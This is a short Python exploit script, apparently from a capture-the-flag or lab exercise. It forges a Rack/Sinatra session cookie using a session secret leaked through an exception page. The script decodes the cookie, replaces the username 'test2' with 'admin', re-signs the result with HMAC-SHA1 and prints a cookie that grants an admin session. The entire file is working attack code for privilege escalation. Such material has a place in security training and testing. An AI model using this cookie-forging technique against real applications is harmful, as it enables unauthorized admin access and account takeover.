#!/usr/bin/env python3

import hashlib, hmac, base64

# this is the session secret, leaked from the sinatra exception
# (you'll have to copy this out of your browser yourself since it changes)
secret = b"yVowgWUvh79miQJOh9bZuZtcvmqxAvcDl"

# this is the data from the rack.session cookie after logging in
# (again, copy this out of your browser - username has to be 5 letters long)
username = b"test2"
b64_data = b"BAh7CUkiD3Nlc3Npb25faWQGOgZFVG86HVJhY2s6OlNlc3Npb246OlNlc3Npb25JZAY6D0BwdWJsaWNfaWRJIkUwNzUwYWMxNmRiYjNhYzg0MThhZDBkMzlkMWUxM2I1MWU3NzAwZmEzMTM0ODA1ODg1NTkxY2MzYzY0ZDlmNzI0BjsARkkiCWNzcmYGOwBGSSIxS3RZT0wvcXZDRFVmeXZSZnU2clI2dW9TRStiUVJLRE9PRjBFSnJNVjFkTT0GOwBGSSINdHJhY2tpbmcGOwBGewZJIhRIVFRQX1VTRVJfQUdFTlQGOwBUSSItZDc5NTgyZGVhMDM0MTA0YTM1MmJkOTAzYmU3MGQ5YmM2ODM0YWZhZAY7AEZJIg51c2VyX25hbWUGOwBGSSIKdGVzdDIGOwBU"

# replace the username for the current session
data = base64.b64decode(b64_data)
print(repr(data))
data = data.replace(username, b"admin")
print(repr(data))
b64_data = base64.b64encode(data)

# create a new signature for ourselves
sig = hmac.new(secret, b64_data, hashlib.sha1).hexdigest().encode()

# replace the cookie with the following contents to create an authenticated admin session
print(b64_data + b"--" + sig)
